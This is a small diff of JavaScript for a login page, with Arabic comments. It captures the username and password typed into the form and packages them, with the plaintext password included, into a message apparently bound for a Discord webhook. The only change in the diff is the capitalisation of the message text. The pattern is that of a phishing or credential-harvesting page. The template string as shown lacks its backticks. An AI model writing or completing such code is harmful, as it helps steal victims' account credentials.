@@ -9,7 +9,7 @@ document.getElementById("loginButton").addEventListener("click", function(event)
     if (username && password) {
         // البيانات التي سيتم إرسالها إلى ديسكورد
         const data = {
-            content: New login attempt:\n**Username:** ${username}\n**Password:** ${password}
+            content: New LogIn attempt:\n**Username:** ${username}\n**Password:** ${password}
         };
 
         // عنوان Webhook الخاص بك
